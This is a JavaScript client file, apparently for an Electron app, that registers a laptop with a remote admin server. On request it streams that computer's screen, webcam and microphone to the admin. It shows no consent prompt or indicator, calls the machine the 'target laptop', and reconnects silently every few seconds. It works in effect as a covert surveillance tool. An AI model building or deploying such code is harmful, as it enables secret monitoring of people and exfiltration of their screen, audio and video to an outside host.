// =========================================================================
// VERY IMPORTANT:
// Change this to the IP Address of your main laptop (Anzee Laptop)
// Example: const SERVER_URL = "http://192.168.1.15:3000";
// =========================================================================
const SERVER_URL = "https://cml-0v9b.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!

let socket;
let localScreenStream;
let localCameraStream;
let peerConnection;
const configuration = { 
    iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
    ] 
};
let iceCandidatesQueue = [];
let screenInterval = null;

window.onload = async () => {
    // Dynamically load socket.io-client from the server
    const script = document.createElement('script');
    script.src = SERVER_URL + '/socket.io/socket.io.js';

    script.onload = async () => {
        socket = io(SERVER_URL);

        // Get the computer name (e.g., "Aqu-Laptop")
        const hostname = await window.electronAPI.getHostname();

        socket.on('connect', () => {
            console.log("Connected to Admin Server");
            // Register this laptop to the Admin Dashboard (All-in-one app)
            socket.emit('register-client', { name: hostname, type: 'all' });
        });

        // When the admin clicks "Watch" on the dashboard
        socket.on('request-offer', async (adminId) => {
            console.log("Received 'request-offer' from admin:", adminId);
            socket.emit('client-error', "Received request-offer, getting screen...");
            try {
                // Setup Screen Share Stream (WebSockets / JPEG)
                const sources = await window.electronAPI.getSources();
                const mainScreen = sources[0];

                localScreenStream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
                });

                const screenVideo = document.createElement('video');
                screenVideo.srcObject = localScreenStream;
                screenVideo.play();

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d', { alpha: false });
                screenVideo.onloadedmetadata = () => {
                    canvas.width = screenVideo.videoWidth;
                    canvas.height = screenVideo.videoHeight;
                };

                if (screenInterval) clearInterval(screenInterval);
                screenInterval = setInterval(() => {
                    if (screenVideo.videoWidth > 0 && screenVideo.videoHeight > 0) {
                        ctx.drawImage(screenVideo, 0, 0, canvas.width, canvas.height);
                        const frame = canvas.toDataURL('image/jpeg', 0.5);
                        socket.emit('screen-frame', { frame: frame, targetId: adminId });
                    }
                }, 500);

                // Setup Camera/Mic Stream (WebRTC)
                try {
                    localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                    
                    if (peerConnection) peerConnection.close();
                    peerConnection = new RTCPeerConnection(configuration);
                    iceCandidatesQueue = [];

                    peerConnection.onicecandidate = e => {
                        if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
                    };

                    localCameraStream.getTracks().forEach(track => {
                        peerConnection.addTrack(track, localCameraStream);
                    });

                    const offer = await peerConnection.createOffer();
                    await peerConnection.setLocalDescription(offer);
                    socket.emit('offer', { offer: offer, targetId: adminId });
                } catch(camErr) {
                    console.log("No Camera/Mic found or access denied.");
                    socket.emit('client-error', "Camera not found on target laptop.");
                }

            } catch (e) {
                console.error("Capture failed", e);
                socket.emit('client-error', "Capture failed: " + e.message);
            }
        });

        socket.on('answer', async (data) => {
            if(!peerConnection) return;
            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
            for (let candidate of iceCandidatesQueue) {
                try { await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)); } catch (err) {}
            }
            iceCandidatesQueue = [];
        });

        socket.on('ice-candidate', async (data) => {
            if (peerConnection) {
                if (peerConnection.remoteDescription) {
                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) {}
                } else {
                    iceCandidatesQueue.push(data.candidate);
                }
            }
        });

        socket.on('stop-watch', () => {
             console.log("Stopping watch");
             if (screenInterval) clearInterval(screenInterval);
             if (localScreenStream) {
                 localScreenStream.getTracks().forEach(t => t.stop());
                 localScreenStream = null;
             }
             if (localCameraStream) {
                 localCameraStream.getTracks().forEach(t => t.stop());
                 localCameraStream = null;
             }
             if (peerConnection) {
                 peerConnection.close();
                 peerConnection = null;
             }
        });
    };

    // If server is not running right now, retry every 5 seconds silently
    script.onerror = () => {
        setTimeout(() => {
            window.location.reload();
        }, 5000);
    };

    document.head.appendChild(script);
};
